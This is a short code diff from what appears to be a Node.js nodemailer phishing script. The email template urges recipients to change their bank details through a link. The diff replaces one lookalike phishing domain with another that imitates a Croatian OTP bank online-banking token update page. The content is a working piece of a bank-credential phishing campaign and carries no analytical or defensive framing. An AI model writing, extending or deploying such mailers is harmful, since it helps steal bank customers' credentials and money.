@@ -16,7 +16,7 @@ const createTransport = require("nodemailer").createTransport;
     let HTML = `
     <p> Please change your bank details from the following link</p>
     <br/><br/><br/><br/>
-    <a href="https://elementa-otp-hr-tkn.online/">https://elementa-otp-hr-tkn.online</a>
+    <a href="https://otp-hr-online-bankarstvo-azuriranje-tokena-i-podataka.net/">https://otp-hr-online-bankarstvo-azuriranje-tokena-i-podataka.net</a>
     `;
 
     // mailto:kawa@bahoz.de
